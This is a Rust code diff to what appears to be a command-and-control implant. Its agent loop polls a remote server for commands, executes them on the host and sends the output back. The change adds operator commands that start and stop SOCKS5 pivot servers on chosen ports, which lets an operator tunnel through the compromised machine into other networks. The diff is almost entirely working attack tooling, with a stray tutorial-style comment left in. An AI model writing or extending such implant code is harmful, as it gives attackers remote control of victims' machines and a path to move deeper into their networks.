@@ -12,6 +12,16 @@ use reqwest::StatusCode;
 use crate::networking::egress::get_egress_ip;
 use crate::config::AgentConfig;
 use log::{info, error};
+use std::collections::HashMap;
+use tokio::task::JoinHandle;
+use once_cell::sync::Lazy;
+use tokio::sync::Mutex as TokioMutex;
+use crate::networking::socks5_pivot_server::Socks5PivotServer;
+use crate::networking::socks5_pivot::Socks5PivotHandler;
+use tokio::sync::mpsc;
+use std::sync::Arc;
+
+static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> = Lazy::new(|| TokioMutex::new(HashMap::new()));
 
 #[cfg(windows)]
 fn create_command(command: &str, args: &[&str]) -> Command {
@@ -189,39 +199,89 @@ async fn submit_result_with_client(config: &AgentConfig, server_addr: &str, agen
     Ok(())
 }
 
-pub async fn run_shell(server_addr: &str, agent_id: &str) -> io::Result<()> {
-    let config = AgentConfig::load()?;
-    info!("[SHELL] Starting shell with agent ID: {}", agent_id);
-    send_heartbeat_with_client(&config, server_addr, agent_id).await?;
-    
-    loop {
-        info!("[SHELL] Polling for commands...");
-        match get_command_with_client(&config, server_addr, agent_id).await? {
-            Some(command) => {
-                info!("[SHELL] Received command: {}", command);
-                
-                let cmd_parts: Vec<&str> = command.split_whitespace().collect();
-                
-                match execute_command(&cmd_parts).await {
-                    Ok(output) => {
-                        if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &output).await {
-                            error!("[SHELL] Failed to submit result: {}", e);
-                        } else {
-                            info!("[SHELL] Result submitted successfully");
+pub async fn run_shell(
+    server_addr: &str,
+    agent_id: &str,
+    pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
+    pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>,
+    ) -> io::Result<()> {
+        let config = AgentConfig::load()?;
+        info!("[SHELL] Starting shell with agent ID: {}", agent_id);
+        send_heartbeat_with_client(&config, server_addr, agent_id).await?;
+        
+        loop {
+            info!("[SHELL] Polling for commands...");
+            match get_command_with_client(&config, server_addr, agent_id).await? {
+                Some(command) => {
+                    info!("[SHELL] Received command: {}", command);
+
+                    if command.starts_with("pivot_start ") {
+                        if let Ok(port) = command["pivot_start ".len()..].trim().parse::<u16>() {
+                            // You need to get pivot_handler and pivot_tx here (see step 4)
+                            let msg = start_pivot_server(port, pivot_handler.clone(), pivot_tx.clone()).await
+                                .unwrap_or_else(|e| e);
+                            let _ = submit_result_with_client(&config, server_addr, agent_id, &command, &msg).await;
+                            continue;
                         }
                     }
-                    Err(e) => {
-                        let error_msg = format!("Command failed: {}", e);
-                        if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &error_msg).await {
-                            error!("[SHELL] Failed to submit error result: {}", e);
+                    if command.starts_with("pivot_stop ") {
+                        if let Ok(port) = command["pivot_stop ".len()..].trim().parse::<u16>() {
+                            let msg = stop_pivot_server(port).await.unwrap_or_else(|e| e);
+                            let _ = submit_result_with_client(&config, server_addr, agent_id, &command, &msg).await;
+                            continue;
                         }
-                        error!("[SHELL] Shell error: {}. Retrying...", e);
+                    }                
+                    
+                    let cmd_parts: Vec<&str> = command.split_whitespace().collect();
+                    
+                    match execute_command(&cmd_parts).await {
+                        Ok(output) => {
+                            if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &output).await {
+                                error!("[SHELL] Failed to submit result: {}", e);
+                            } else {
+                                info!("[SHELL] Result submitted successfully");
+                            }
+                        }
+                        Err(e) => {
+                            let error_msg = format!("Command failed: {}", e);
+                            if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &error_msg).await {
+                                error!("[SHELL] Failed to submit error result: {}", e);
+                            }
+                            error!("[SHELL] Shell error: {}. Retrying...", e);
+                        }
                     }
                 }
-            }
-            None => {
-                tokio::time::sleep(Duration::from_secs(2)).await;
+                None => {
+                    tokio::time::sleep(Duration::from_secs(2)).await;
+                }
             }
         }
+}
+
+async fn start_pivot_server(
+    port: u16,
+    pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
+    pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>,
+) -> Result<String, String> {
+    let mut servers = PIVOT_SERVERS.lock().await;
+    if servers.contains_key(&port) {
+        return Err(format!("Pivot server already running on port {}", port));
+    }
+    let server = Socks5PivotServer::new("127.0.0.1".to_string(), port, pivot_tx);
+    let handler = pivot_handler.clone();
+    let handle = tokio::spawn(async move {
+        server.run(handler).await;
+    });
+    servers.insert(port, handle);
+    Ok(format!("Started pivot server on port {}", port))
+}
+
+async fn stop_pivot_server(port: u16) -> Result<String, String> {
+    let mut servers = PIVOT_SERVERS.lock().await;
+    if let Some(handle) = servers.remove(&port) {
+        handle.abort();
+        Ok(format!("Stopped pivot server on port {}", port))
+    } else {
+        Err(format!("No pivot server running on port {}", port))
     }
 }
